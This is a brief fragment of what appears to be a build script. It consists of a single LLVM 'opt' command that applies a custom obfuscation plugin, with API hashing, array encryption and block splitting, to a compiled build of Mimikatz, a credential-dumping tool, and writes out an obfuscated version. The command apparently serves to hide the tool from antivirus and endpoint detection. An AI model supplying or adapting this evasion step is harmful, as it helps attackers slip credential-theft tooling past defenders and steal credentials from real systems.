...
$LLVM_BIN/opt -load-pass-plugin "../../build/ObfuscationPlugin.so" -passes="api_hashing" -os_version="windows" -api_type="threadpool" --api_entry="wmain" --excluded_funcs="" -swap_prob=66 -arrenc_seed=0xAABBCCDD -sub_loop=2 -split_num=2 -S "$MIMIKATZ_ROOT/build/combined_mimikatz.ll" -o "$MIMIKATZ_ROOT/build/obfuscated_mimikatz.ll"
